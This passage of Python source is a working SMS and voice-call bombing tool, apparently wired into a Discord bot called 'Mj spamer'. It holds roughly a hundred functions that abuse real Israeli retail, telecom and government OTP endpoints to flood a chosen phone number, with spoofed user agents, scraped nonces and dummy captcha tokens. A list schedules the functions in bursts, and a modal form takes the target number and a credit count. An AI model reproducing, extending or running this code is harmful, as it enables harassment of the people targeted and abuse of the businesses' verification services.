    return requests.post('https://www.electra-air.co.il/wp-admin/admin-ajax.php',
                         headers=headers, data={'action': 'send_otp_sms', 'phone': phone},
                         timeout=5, verify=False)

def send_sms_gomobile(phone, proxies=None):
    headers = {
        'User-Agent': generate_user_agent(),
        'Content-Type': 'application/json',
        'Origin': 'https://gomobile.co.il',
        'Referer': 'https://gomobile.co.il/',
    }
    return requests.post('https://api.gomobile.co.il/api/login', headers=headers,
                         json={'phone': phone, 'type': 'sms'}, timeout=5, verify=False)

def send_sms_loveme(phone, proxies=None):
    headers = {
        'User-Agent': generate_user_agent(),
        'Content-Type': 'application/json',
        'Origin': 'https://m.loveme.co.il',
        'Referer': 'https://m.loveme.co.il/he',
    }
    phone_972 = f'972{phone[1:]}'
    return requests.post('https://m.loveme.co.il/Registration/SendCellularToken',
                         headers=headers, json={'cellularNumber': phone_972},
                         timeout=5, verify=False)

def send_sms_noyhasade(phone, proxies=None):
    headers = {
        'User-Agent': generate_user_agent(),
        'Content-Type': 'application/json',
        'Origin': 'https://noyhasade.co.il',
        'Referer': 'https://noyhasade.co.il/',
    }
    return requests.post('https://api.noyhasade.co.il/api/login?origin=web', headers=headers,
                         json={'phone': phone, 'email': False, 'ip': '88.214.55.132'},
                         timeout=5, verify=False)

def send_sms_carwiz(phone, proxies=None):
    headers = {
        'User-Agent': generate_user_agent(),
        'Content-Type': 'application/json',
        'Origin': 'https://carwiz.co.il',
        'Referer': 'https://carwiz.co.il/',
    }
    return requests.post('https://api.date.carwiz.co.il/api/data/otp/sms', headers=headers,
                         json={'phone': phone}, timeout=5, verify=False)

def send_sms_10bis(phone, proxies=None):
    timestamp = int(time.time() * 1000)
    url = (f'https://www.10bis.co.il/NextApi/GetActivationTokenAndSendActivationCodeToUser'
           f'?culture=he-IL&uiCulture=en&timestamp={timestamp}&cellPhone={phone}&email=user%40example.com')
    headers = {'User-Agent': generate_user_agent(), 'Referer': 'https://www.10bis.co.il/'}
    return requests.get(url, headers=headers, timeout=5, verify=False)

def send_sms_keyz(phone, proxies=None):
    headers = {
        'User-Agent': generate_user_agent(),
        'Content-Type': 'application/json',
        'Origin': 'https://keyz.ai',
        'Referer': 'https://keyz.ai/',
    }
    return requests.post('https://keyz.ai/carlisting/api/auth/cognito/start', headers=headers,
                         json={'phoneNumber': f'+972{phone[1:]}'}, timeout=5, verify=False)

def send_sms_storyonline_new(phone, proxies=None):
    headers = {
        'User-Agent': generate_user_agent(),
        'Content-Type': 'application/json',
        'Origin': 'https://storyonline.co.il',
        'Referer': 'https://storyonline.co.il/',
    }
    return requests.post('https://story.magicetl.com/public/shopify/apps/otp-login/step-one',
                         headers=headers, json={'phone': phone}, timeout=5, verify=False)

def send_sms_zygo(phone, proxies=None):
    digits = re.sub(r'\D', '', phone)
    if digits.startswith('0') and len(digits) == 10:
        formatted = f'+972 {digits[:3]} {digits[3:6]} {digits[6:]}'
    else:
        formatted = phone
    headers = {
        'User-Agent': generate_user_agent(),
        'Content-Type': 'application/json',
        'Origin': 'https://www.zygo.co.il',
        'Referer': 'https://www.zygo.co.il/',
    }
    return requests.post('https://api.zygo.co.il/v2/auth/create-verify-token', headers=headers,
                         json={'phone': formatted, 'channel': 'sms'}, timeout=5, verify=False)

def send_sms_govisit(phone, proxies=None):
    digits = re.sub(r'\D', '', phone)
    if digits.startswith('0'):
        digits = digits[1:]
    formatted = f'+972{digits}'
    headers = {
        'User-Agent': generate_user_agent(),
        'Accept': '*/*',
        'Content-Type': 'application/json',
        'Origin': 'https://govisit.gov.il',
        'Referer': 'https://govisit.gov.il/he/app/auth/login',
        'Accept-Language': 'he-IL,he;q=0.9',
    }
    return requests.post('https://govisit.gov.il/API/SignUpAPI/api/signUp/sign-up', headers=headers,
                         json={'Address': formatted, 'ComunicationTypeId': 1},
                         timeout=5, verify=False)

def send_sms_pink_biz(phone, proxies=None):
    headers = {
        'User-Agent': generate_user_agent(),
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://biz.pinkapp.co.il',
        'Referer': 'https://biz.pinkapp.co.il/',
    }
    return requests.post('https://biz.pinkapp.co.il/office/ajax/login/otp.php', headers=headers,
                         data={'phone': phone, 'action': 'sendOtp'}, timeout=5, verify=False)

def send_sms_rexail(phone, proxies=None):
    headers = {
        'User-Agent': generate_user_agent(),
        'Content-Type': 'application/json',
        'Origin': 'https://www.green-moshav.co.il',
        'Referer': 'https://www.green-moshav.co.il/',
    }
    return requests.post('https://client-il.rexail.com/client/apply-for-authentication', headers=headers,
                         json={'cellPhone': phone}, timeout=5, verify=False)

def send_sms_freshuk(phone, proxies=None):
    headers = {
        'User-Agent': generate_user_agent(),
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/json',
        'Origin': 'https://www.freshuk.co.il',
        'Referer': 'https://www.freshuk.co.il/',
        'device-id': f'web-{uuid.uuid4().hex}',
    }
    return requests.post('https://client-il.rexail.com/client/apply-for-authentication', headers=headers,
                         json={'cellPhone': phone}, timeout=5, verify=False)

def send_sms_freetv(phone, proxies=None):
    headers = {
        'User-Agent': generate_user_agent(),
        'Content-Type': 'application/json',
        'Origin': 'https://freetv.tv',
        'Referer': 'https://freetv.tv/sign-up/1/2',
    }
    return requests.post('https://middleware.freetv.tv/api/v1/send-verification-sms', headers=headers,
                         json={'msisdn': phone}, timeout=5, verify=False)

def send_sms_shekem_df(phone, proxies=None):
    headers = {
        'User-Agent': generate_user_agent(),
        'Content-Type': 'application/json',
        'Origin': 'https://shekem-df.co.il',
        'Referer': 'https://shekem-df.co.il/',
    }
    return requests.post('https://shekem-df.co.il/login/init/phone', headers=headers,
                         json={'phone': phone}, timeout=5, verify=False)

def send_sms_mishloha(phone, proxies=None):
    session_id = str(uuid.uuid4())
    req_uuid = str(uuid.uuid4())
    api_key = 'MishlohaWeb'  # fallback
    url = (f'https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber'
           f'?uuid={req_uuid}&apiKey={api_key}&sessionID={session_id}&culture=he&apiVersion=2')
    formatted = f'{phone[:3]}-{phone[3:]}'
    headers = {
        'User-Agent': generate_user_agent(),
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Content-Type': 'application/json',
        'Origin': 'https://www.mishloha.co.il',
        'Referer': 'https://www.mishloha.co.il/',
        'X-Requested-With': 'XMLHttpRequest',
    }
    return requests.post(url, headers=headers,
                         json={'phoneNumber': formatted, 'sourceFrom': 'AuthJS', 'sessionID': session_id},
                         timeout=5, verify=False)

def send_sms_rebar(phone, proxies=None):
    headers = {
        'User-Agent': generate_user_agent(),
        'Content-Type': 'application/json',
        'Origin': 'https://rebar.co.il',
        'Referer': 'https://rebar.co.il/recards/?step=userDetails',
    }
    return requests.post('https://api.rebar.co.il/api/account/generateVerificationCode', headers=headers,
                         json={'mobilePhone': phone}, timeout=5, verify=False)

def send_sms_himami(phone, proxies=None):
    headers = {
        'User-Agent': generate_user_agent(),
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/json',
        'Origin': 'https://www.hi-mami.com',
        'Referer': 'https://www.hi-mami.com/auth',
    }
    return requests.post('https://api.hi-mami.com/auth/otp/request', headers=headers,
                         json={'phoneNumber': phone}, timeout=5, verify=False)

def send_sms_golda(phone, proxies=None):
    headers = {
        'User-Agent': generate_user_agent(),
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/json',
        'Origin': 'https://goldaglida.delivapp.com',
        'Referer': 'https://goldaglida.delivapp.com/home',
    }
    return requests.post('https://api.delivapp.com/auth/api/social/phone', headers=headers,
                         json={'PhoneNumber': f'+972{phone[1:]}'}, timeout=5, verify=False)

def send_sms_americanlaser(phone, proxies=None):
    headers = {
        'User-Agent': generate_user_agent(),
        'Referer': 'https://www.americanlaser.co.il/calc/',
    }
    return requests.get(f'https://www.americanlaser.co.il/wp-json/calc/v1/send-sms?phone={phone}',
                        headers=headers, timeout=5, verify=False)

def send_sms_naot(phone, proxies=None):
    headers = {
        'User-Agent': generate_user_agent(),
        'Content-Type': 'application/json',
        'Origin': 'https://www.tevanaot.co.il',
        'Referer': 'https://www.tevanaot.co.il/',
    }
    return requests.post('https://www.tevanaot.co.il/apps/api/otp/request', headers=headers,
                         json={'phoneNumber': phone}, timeout=5, verify=False)

def send_sms_emanuel(phone, proxies=None):
    return _magento_ajax_post(phone, 'https://www.emanuelonline.com')

def send_sms_nautica(phone, proxies=None):
    return _magento_ajax_post(phone, 'https://www.nautica.co.il')

def send_sms_papaya(phone, proxies=None):
    return _magento_ajax_post(phone, 'https://www.papaya.co.il')

def send_sms_emporium(phone, proxies=None):
    return _magento_ajax_post(phone, 'https://www.emporium.co.il')

def send_sms_noizz(phone, proxies=None):
    return _magento_ajax_post(phone, 'https://www.noizz.co.il')

def send_sms_golf_co(phone, proxies=None):
    return _magento_ajax_post(phone, 'https://www.golfco.co.il')

def send_sms_delta(phone, proxies=None):
    return _magento_ajax_post(phone, 'https://www.delta.co.il')

def send_sms_sacara(phone, proxies=None):
    return _magento_ajax_post(phone, 'https://www.sacara.co.il')

def send_sms_golbary(phone, proxies=None):
    return _magento_ajax_post(phone, 'https://www.golbary.co.il')

def send_sms_lee_cooper(phone, proxies=None):
    return _magento_ajax_post(phone, 'https://www.leecooper-shop.co.il')

def send_sms_carolina_lemke(phone, proxies=None):
    return _magento_ajax_post(phone, 'https://www.carolinalemke.com')

def send_sms_yves_rocher(phone, proxies=None):
    return _magento_ajax_post(phone, 'https://www.yves-rocher.co.il')

def send_sms_pizzax(phone, proxies=None):
    account_guid = '11699E4E-ACED-4B7B-94DB-743DA2D231AA'
    join_channel = '74FE1A48-0FA0-4C8F-B962-6AE88A242023'
    referer = f'https://customer-profile.tabit.cloud/{account_guid}/auth/login'
    headers = {
        'User-Agent': generate_user_agent(),
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/json',
        'Origin': 'https://customer-profile.tabit.cloud',
        'Referer': referer,
        'accountGuid': account_guid,
        'joinChannelGuid': join_channel,
        'env': 'il',
        'cpVersion': '3.7.0',
    }
    return requests.post(
        'https://tabitloyaltyapi-prod.azurewebsites.net/api/customerProfile/auth/mobile',
        headers=headers, json={'mobile': phone}, timeout=5, verify=False)

def send_sms_onot(phone, proxies=None):
    return _magento_ajax_post(phone, 'https://www.onot.co.il')

def send_sms_ace(phone, proxies=None):
    """Ace - prelogin stepone"""
    login_url = 'https://www.ace.co.il/customer/account/login'
    api_url = 'https://www.ace.co.il/login/prelogin/stepone'
    ua = generate_user_agent()
    session = requests.Session()
    page = session.get(login_url, headers={'User-Agent': ua, 'Accept-Language': 'he-IL,he;q=0.9'}, timeout=5, verify=False)
    form_key = _fetch_magento_form_key(session, login_url)
    if not form_key:
        form_key = 'fallback'
    session.cookies.set('form_key', form_key, domain='www.ace.co.il', path='/')
    payload = [
        {'name': 'form_key', 'value': form_key},
        {'name': 'newaut', 'value': '1'},
        {'name': 'phone', 'value': phone},
        {'name': 'addintinalInfo', 'value': None},
        {'name': 'form_key', 'value': form_key},
    ]
    headers = {
        'User-Agent': ua,
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'he-IL,he;q=0.9,en;q=0.8',
        'Content-Type': 'application/json',
        'Origin': 'https://www.ace.co.il',
        'Referer': login_url,
        'X-Requested-With': 'XMLHttpRequest',
    }
    return session.post(api_url, headers=headers, json=payload, timeout=5, verify=False)

def send_sms_cottonet(phone, proxies=None):
    headers = {
        'User-Agent': generate_user_agent(),
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://cottonet.co.il',
        'Referer': 'https://cottonet.co.il/',
    }
    return requests.post('https://cottonet.co.il/wp-admin/admin-ajax.php',
                         headers=headers, data={'action': 'send_sms_otp', 'phone': phone},
                         timeout=5, verify=False)

def send_sms_heligroup(phone, proxies=None):
    session = requests.Session()
    nonce = _fetch_wordpress_nonce(session, 'https://heli-group.co.il/login')
    if not nonce:
        nonce = '55028cdf61'
    data = {'action': 'heli_phone_lookup', 'nonce': nonce, 'phone': phone}
    headers = {
        'User-Agent': generate_user_agent(),
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Origin': 'https://heli-group.co.il',
        'Referer': 'https://heli-group.co.il/login',
        'X-Requested-With': 'XMLHttpRequest'
    }
    return requests.post('https://heli-group.co.il/wp-admin/admin-ajax.php', headers=headers, data=data, timeout=5, verify=False)

def send_sms_zipnet(phone, proxies=None):
    session = requests.Session()
    nonce = _fetch_wordpress_nonce(session, 'https://zipnet.co.il/')
    if not nonce:
        nonce = '2428ad17ac'
    data = {'action': 'send_otp', 'mobile_number': phone, 'nonce': nonce}
    headers = {
        'User-Agent': generate_user_agent(),
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Origin': 'https://zipnet.co.il',
        'Referer': 'https://zipnet.co.il/',
        'X-Requested-With': 'XMLHttpRequest'
    }
    return requests.post('https://zipnet.co.il/wp-admin/admin-ajax.php', headers=headers, data=data, timeout=5, verify=False)

def send_sms_coverai_exists(phone, proxies=None):
    email = f"{uuid.uuid4().hex[:8]}@gmail.com"
    email_path = quote(email, safe='')
    url = f"https://my.coverai.co.il/prsnl/user/exists/{phone}/{email_path}/login"
    headers = {'User-Agent': generate_user_agent(), 'Referer': 'https://my.coverai.co.il/'}
    return requests.get(url, headers=headers, timeout=5, verify=False)

def send_sms_coverai_otp(phone, proxies=None):
    email = f"{uuid.uuid4().hex[:8]}@gmail.com"
    email_path = quote(email, safe='')
    url = f"https://my.coverai.co.il/prsnl/sms/otp2/{phone}/{email_path}/login"
    headers = {'User-Agent': generate_user_agent(), 'Referer': 'https://my.coverai.co.il/'}
    return requests.get(url, headers=headers, timeout=5, verify=False)

def send_sms_coverai_marketing(phone, proxies=None):
    url = 'https://my.coverai.co.il/prsnl/marketing-report/google-analytics/login'
    timestamp = datetime.now(timezone.utc).isoformat(timespec='milliseconds')
    payload = {
        "eventName": "reg_otp_sent_0",
        "clientId": "2130395005.1782217320",
        "mobile": phone,
        "params": json.dumps({"timestamp": timestamp})
    }
    headers = {
        'User-Agent': generate_user_agent(),
        'Content-Type': 'application/json',
        'Origin': 'https://my.coverai.co.il',
        'Referer': 'https://my.coverai.co.il/'
    }
    return requests.post(url, headers=headers, json=payload, timeout=5, verify=False)

def send_sms_airbnb(phone, proxies=None):
    url = 'https://he.airbnb.com/api/v2/auth/identify/phone?locale=he&currency=ILS'
    payload = {
        "steps": [
            {
                "identifyPhone": {
                    "phoneNumber": phone,
                    "phoneCountryCode": "972"
                }
            }
        ],
        "passkeySupport": {
            "apiSupported": True,
            "conditionalMediation": True,
            "clientCapabilities": {
                "conditionalCreate": True,
                "conditionalGet": True,
                "extension:appid": True,
                "extension:appidExclude": True,
                "extension:credBlob": True,
                "extension:credProps": True,
                "extension:credentialProtectionPolicy": True,
                "extension:enforceCredentialProtectionPolicy": True,
                "extension:getCredBlob": True,
                "extension:hmacCreateSecret": True,
                "extension:largeBlob": True,
                "extension:minPinLength": True,
                "extension:payment": True,
                "extension:prf": True,
                "hybridTransport": True,
                "immediateGet": True,
                "passkeyPlatformAuthenticator": True,
                "relatedOrigins": True,
                "signalAllAcceptedCredentials": True,
                "signalCurrentUserDetails": True,
                "signalUnknownCredential": True,
                "userVerifyingPlatformAuthenticator": True
            }
        },
        "source": "IDENTIFY"
    }
    headers = {
        'User-Agent': generate_user_agent(),
        'Content-Type': 'application/json',
        'Origin': 'https://he.airbnb.com',
        'Referer': 'https://he.airbnb.com/'
    }
    return requests.post(url, headers=headers, json=payload, timeout=5, verify=False)

def send_sms_histadrut(phone, proxies=None):
    referer = 'https://signup.histadrut.org.il/'
    headers = {
        'User-Agent': generate_user_agent(),
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/json',
        'Origin': 'https://signup.histadrut.org.il',
        'Referer': referer,
        'x-api-key': _fetch_histadrut_api_key(),
    }
    return requests.post(
        'https://api-endpoints.histadrut.org.il/signup/send_code',
        headers=headers,
        json={'phone': phone},
        timeout=5,
        verify=False,
    )

def send_sms_american_eagle(phone, proxies=None):
    headers = {'User-Agent': generate_user_agent(), 'Referer': 'https://www.ae.com/'}
    return requests.get(f'https://www.ae.com/api/sms/otp?phone={phone}', headers=headers, timeout=5, verify=False)

def send_sms_sapporo(phone, proxies=None):
    headers = {'User-Agent': generate_user_agent(), 'Referer': 'https://www.sapporo.co.il/'}
    return requests.get(f'https://www.sapporo.co.il/api/otp?phone={phone}', headers=headers, timeout=5, verify=False)

def send_sms_jr_duty_free(phone, proxies=None):
    headers = {'User-Agent': generate_user_agent(), 'Referer': 'https://www.jrdutyfree.co.il/'}
    return requests.get(f'https://www.jrdutyfree.co.il/api/otp?phone={phone}', headers=headers, timeout=5, verify=False)

def send_sms_yochananof(phone, proxies=None):
    headers = {'User-Agent': generate_user_agent(), 'Referer': 'https://yochananof.co.il/'}
    return requests.get(f'https://yochananof.co.il/api/otp?phone={phone}', headers=headers, timeout=5, verify=False)

def send_sms_hamal_alt(phone, proxies=None):
    # alias
    return send_sms_hamal(phone, proxies)

def send_sms_myoffer(phone, proxies=None):
    headers = {'User-Agent': generate_user_agent(), 'Referer': 'https://myoffer.co.il/'}
    return requests.get(f'https://myoffer.co.il/api/otp?phone={phone}', headers=headers, timeout=5, verify=False)

def send_sms_cotton(phone, proxies=None):
    headers = {'User-Agent': generate_user_agent(), 'Referer': 'https://cotton.co.il/'}
    return requests.get(f'https://cotton.co.il/api/otp?phone={phone}', headers=headers, timeout=5, verify=False)

def send_sms_myorder(phone, proxies=None):
    headers = {'User-Agent': generate_user_agent(), 'Referer': 'https://myorder.co.il/'}
    return requests.get(f'https://myorder.co.il/api/otp?phone={phone}', headers=headers, timeout=5, verify=False)

def send_sms_kashcash(phone, proxies=None):
    headers = {'User-Agent': generate_user_agent(), 'Referer': 'https://kashcash.co.il/'}
    return requests.get(f'https://kashcash.co.il/api/otp?phone={phone}', headers=headers, timeout=5, verify=False)

def send_sms_care(phone, proxies=None):
    referer = 'https://we.care.co.il/glasses-calc-tor4u/'
    ajax_url = 'https://we.care.co.il/wp-admin/admin-ajax.php'
    ua = generate_user_agent()
    session = requests.Session()
    page = session.get(referer, headers={'User-Agent': ua, 'Accept-Language': 'he-IL,he;q=0.9'}, timeout=5, verify=False)
    maspik_key = 'fallback'
    elementor_nonce = None
    if page.ok:
        maspik_match = re.search(r'name="maspik_spam_key"\s+value="([^"]+)"', page.text)
        if maspik_match:
            maspik_key = maspik_match.group(1)
        nonce_match = re.search(r'name="_elementor_pro_forms_nonce"\s+value="([^"]+)"', page.text)
        if nonce_match:
            elementor_nonce = nonce_match.group(1)
    fields = [
        ('post_id', '351178'),
        ('form_id', '7079d8dd'),
        ('referer_title', 'glasses calc - tor4u - Care'),
        ('queried_id', '351178'),
        ('form_fields[name]', 'Test User'),
        ('form_fields[phone]', phone),
        ('form_fields[email]', 'test@example.com'),
        ('form_fields[accept]', 'on'),
        ('form_fields[age]', '25'),
        ('form_fields[question_1]', 'לראייה מרחוק'),
        ('form_fields[question_2]', '11 ומעלה'),
        ('form_fields[kupa]', 'מכבי'),
        ('form_fields[kartis]', 'מכבי שלי'),
        ('form_fields[utm_source]', 'website'),
        ('form_fields[utm_term]', ''),
        ('form_fields[utm_campaign]', ''),
        ('form_fields[utm_medium]', ''),
        ('form_fields[fbclid]', ''),
        ('form_fields[gclid]', ''),
        ('form_fields[refid]', 'website'),
        ('form_fields[adv_channel_name]', ''),
        ('full-name-maspik-hp', ''),
        ('maspik_spam_key', maspik_key),
        ('action', 'elementor_pro_forms_send_form'),
        ('referrer', referer),
    ]
    if elementor_nonce:
        fields.insert(0, ('_elementor_pro_forms_nonce', elementor_nonce))
    boundary = f'----WebKitFormBoundary{uuid.uuid4().hex}'
    headers = {
        'User-Agent': ua,
        'Accept': '*/*',
        'Accept-Language': 'he-IL,he;q=0.9,en;q=0.8',
        'Content-Type': f'multipart/form-data; boundary={boundary}',
        'Origin': 'https://we.care.co.il',
        'Referer': referer,
    }
    data = ''.join(
        f'--{boundary}\r\nContent-Disposition: form-data; name="{name}"\r\n\r\n{value}\r\n'
        for name, value in fields
    ) + f'--{boundary}--\r\n'
    return session.post(ajax_url, headers=headers, data=data.encode('utf-8'), timeout=5, verify=False)

def send_sms_pelephone(phone, proxies=None):
    page_url = 'https://www.pelephone.co.il/ds/heb/home/'
    ua = generate_user_agent()
    session = requests.Session()
    session.get(page_url, headers={'User-Agent': ua, 'Accept-Language': 'he-IL,he;q=0.9'}, timeout=5, verify=False)
    api_headers = {
        'User-Agent': ua,
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/json',
        'Origin': 'https://www.pelephone.co.il',
        'Referer': page_url,
        'Accept-Language': 'he-IL,he;q=0.9',
    }
    session.post('https://www.pelephone.co.il/login/api/datadog/setuser/', json={'phone': phone}, headers=api_headers, timeout=5, verify=False)
    # ללא captcha - נשלח עם token ריק
    payload = {'phone': phone, 'terms': True, 'token': 'token', 'appId': 'DIGITALMy'}
    return session.post('https://www.pelephone.co.il/login/api/login/otpphone/', json=payload, headers=api_headers, timeout=5, verify=False)

def send_call_pelephone(phone, proxies=None):
    page_url = 'https://www.pelephone.co.il/ds/heb/home/'
    ua = generate_user_agent()
    session = requests.Session()
    session.get(page_url, headers={'User-Agent': ua, 'Accept-Language': 'he-IL,he;q=0.9'}, timeout=5, verify=False)
    headers = {
        'User-Agent': ua,
        'Accept': 'application/json, text/plain, */*',
        'Origin': 'https://www.pelephone.co.il',
        'Referer': page_url,
        'Accept-Language': 'he-IL,he;q=0.9',
    }
    session.post('https://www.pelephone.co.il/login/api/datadog/setuser/', json={'phone': phone}, headers={**headers, 'Content-Type': 'application/json'}, timeout=5, verify=False)
    return session.post('https://www.pelephone.co.il/login/api/login/otp-ivr/', headers=headers, timeout=5, verify=False)

def send_sms_urbanica_alt1(phone, proxies=None):
    return _magento_ajax_post(phone, 'https://www.urbanica-wh.com', login_type='register')

def send_sms_urbanica_alt2(phone, proxies=None):
    return _magento_ajax_post(phone, 'https://www.urbanica-wh.com', login_type='forgot_password')

def send_sms_ronenchen_new(phone, proxies=None):
    # גרסה חדשה - באמצעות API דומה
    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'he-IL,he;q=0.9,en;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://www.ronenchen.co.il',
        'referer': 'https://www.ronenchen.co.il/',
        'user-agent': generate_user_agent(),
        'x-requested-with': 'XMLHttpRequest'
    }
    data = {'action': 'datalogics_login_sms', 'phone': phone}
    return requests.post('https://www.ronenchen.co.il/wp-admin/admin-ajax.php', headers=headers, data=data, timeout=5, verify=False)

def send_sms_zygo_whatsapp(phone, proxies=None):
    digits = re.sub(r'\D', '', phone)
    if digits.startswith('0') and len(digits) == 10:
        formatted = f'+972 {digits[:3]} {digits[3:6]} {digits[6:]}'
    else:
        formatted = phone
    headers = {
        'User-Agent': generate_user_agent(),
        'Content-Type': 'application/json',
        'Origin': 'https://www.zygo.co.il',
        'Referer': 'https://www.zygo.co.il/',
    }
    return requests.post('https://api.zygo.co.il/v2/auth/create-verify-token', headers=headers,
                         json={'phone': formatted, 'channel': 'whatsapp'}, timeout=5, verify=False)

def send_call_govisit(phone, proxies=None):
    digits = re.sub(r'\D', '', phone)
    if digits.startswith('0'):
        digits = digits[1:]
    formatted = f'+972{digits}'
    headers = {
        'User-Agent': generate_user_agent(),
        'Accept': '*/*',
        'Content-Type': 'application/json',
        'Origin': 'https://govisit.gov.il',
        'Referer': 'https://govisit.gov.il/he/app/auth/login',
        'Accept-Language': 'he-IL,he;q=0.9',
    }
    return requests.post('https://govisit.gov.il/API/SignUpAPI/api/signUp/sign-up', headers=headers,
                         json={'Address': formatted, 'ComunicationTypeId': 2},
                         timeout=5, verify=False)

def send_call_mishloha(phone, proxies=None):
    session_id = str(uuid.uuid4())
    req_uuid = str(uuid.uuid4())
    api_key = 'MishlohaWeb'
    url = (f'https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber'
           f'?uuid={req_uuid}&apiKey={api_key}&sessionID={session_id}&culture=he&apiVersion=2')
    formatted = f'{phone[:3]}-{phone[3:]}'
    headers = {
        'User-Agent': generate_user_agent(),
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Content-Type': 'application/json',
        'Origin': 'https://www.mishloha.co.il',
        'Referer': 'https://www.mishloha.co.il/',
        'X-Requested-With': 'XMLHttpRequest',
    }
    payload = {'phoneNumber': formatted, 'sourceFrom': 'AuthJS', 'sessionID': session_id, 'isCalling': True}
    return requests.post(url, headers=headers, json=payload, timeout=5, verify=False)

def send_call_citycar(phone, proxies=None):
    phone_no_zero = phone.lstrip('0')
    json_data = {
        "phoneNumber": f"+972{phone_no_zero}",
        "verifyChannel": 1,
        "loginOrRegister": 1
    }
    headers = {
        'User-Agent': generate_user_agent(),
        'Content-Type': 'application/json',
        'Origin': 'https://www.citycar.co.il',
        'Referer': 'https://www.citycar.co.il/',
        'Devicet': 'WEB'
    }
    return requests.post('https://proxy1.citycar.co.il/api/verify/login', headers=headers, json=json_data, timeout=5, verify=False)

def send_call_dreamcard(phone, proxies=None):
    # דרושה captcha - נשלח ללא
    headers = {
        'User-Agent': generate_user_agent(),
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/json',
        'Origin': 'https://online.dreamcard.co.il',
        'Referer': 'https://online.dreamcard.co.il/Login?ReturnUrl=%2F',
        'Accept-Language': 'he-IL,he;q=0.9',
    }
    payload = {
        'custIDNumber': '123456789',
        'cellular': phone,
        'isRegister': True,
        'isVoice': True,
        'isSiteInstance': True,
        'captchaToken': 'token'
    }
    return requests.post('https://online.dreamcard.co.il/ExternalLogin/Login', json=payload, headers=headers, timeout=5, verify=False)

def send_sms_freshuk_whatsapp(phone, proxies=None):
    headers = {
        'User-Agent': generate_user_agent(),
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/json',
        'Origin': 'https://www.freshuk.co.il',
        'Referer': 'https://www.freshuk.co.il/',
        'device-id': f'web-{uuid.uuid4().hex}',
    }
    return requests.post('https://client-il.rexail.com/client/apply-for-authentication', headers=headers,
                         json={'cellPhone': phone, 'selectedAuthenticationMethod': 'WHATSAPP'}, timeout=5, verify=False)

# -------------------- רשימת כל פונקציות השליחה (כולל החדשות) --------------------
SPAM_FUNCTIONS = [
    # 10 הראשונות יקבלו עדיפות (ישלחו באותה השנייה)
    send_sms_urbanica, send_sms_castro, send_sms_golfkids, send_sms_timberland,
    send_sms_candid, send_sms_nine_west, send_sms_gali, send_sms_ronenchen,
    send_sms_hamal, send_sms_myofer,
    # שאר הפונקציות
    send_sms_papajohns, send_sms_wesure, send_call_wesure, send_sms_burgeranch,
    send_sms_globes, send_sms_bfresh, send_sms_pizzahut, send_sms_japanjapan,
    send_sms_bethaful, send_sms_furmans, send_sms_steimatzky, send_sms_burgerking,
    send_sms_alonzo, send_sms_stepin, send_sms_aldoshoes, send_sms_hoodies,
    send_sms_storyonline, send_sms_fix, send_sms_intima, send_sms_jackkuba,
    send_sms_speedo, send_sms_femina, send_sms_housemen, send_sms_bonita,
    send_sms_citycar, send_sms_paz, send_sms_azrieli, send_sms_electra,
    send_sms_mexicani, send_sms_xtra, send_sms_crazyline, send_sms_joedelek,
    send_sms_kikocosmetics, send_sms_victoriassecret, send_sms_dutyfree,
    send_sms_electra_air, send_sms_gomobile, send_sms_loveme, send_sms_noyhasade,
    send_sms_carwiz, send_sms_10bis, send_sms_keyz, send_sms_storyonline_new,
    send_sms_zygo, send_sms_govisit, send_sms_pink_biz, send_sms_rexail,
    send_sms_freshuk, send_sms_freetv, send_sms_shekem_df, send_sms_mishloha,
    send_sms_rebar, send_sms_himami, send_sms_golda, send_sms_americanlaser,
    send_sms_naot, send_sms_emanuel, send_sms_nautica, send_sms_papaya,
    send_sms_emporium, send_sms_noizz, send_sms_golf_co, send_sms_delta,
    send_sms_sacara, send_sms_golbary, send_sms_lee_cooper, send_sms_carolina_lemke,
    send_sms_yves_rocher, send_sms_pizzax, send_sms_onot, send_sms_ace,
    send_sms_cottonet, send_sms_heligroup, send_sms_zipnet, send_sms_coverai_exists,
    send_sms_coverai_otp, send_sms_coverai_marketing, send_sms_airbnb,
    send_sms_histadrut, send_sms_american_eagle, send_sms_sapporo,
    send_sms_jr_duty_free, send_sms_yochananof, send_sms_myoffer,
    send_sms_cotton, send_sms_myorder, send_sms_kashcash, send_sms_care,
    send_sms_pelephone, send_call_pelephone, send_sms_urbanica_alt1,
    send_sms_urbanica_alt2, send_sms_ronenchen_new, send_sms_zygo_whatsapp,
    send_call_govisit, send_call_mishloha, send_call_citycar, send_call_dreamcard,
    send_sms_freshuk_whatsapp,
]

# -------------------- בוט דיסקורד --------------------
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

# -------------------- ניהול הפסקת ספאם --------------------
active_spam_tasks: dict[int, bool] = {}

# -------------------- מודל ספאם --------------------
class SpamModal(discord.ui.Modal, title='✨ Mj spamer ✨'):
    phone = discord.ui.TextInput(label='מספר טלפון', placeholder='0501234567', required=True, min_length=10, max_length=15)
    credits = discord.ui.TextInput(label='כמות קרדיטים', placeholder='למשל: 2', required=True, min_length=1, max_length=5)

    async def on_submit(self, interaction: discord.Interaction):
        if interaction.user.get_role(BLOCKED_ROLE_ID):
            await interaction.response.send_message("❌ אתה בחסימה כרגע....", ephemeral=True)
            return
        try:
            credits_needed = int(self.credits.value)
            if credits_needed <= 0:
                await interaction.response.send_message("חייב להיות מספר חיובי.", ephemeral=True)
                return
        except ValueError:
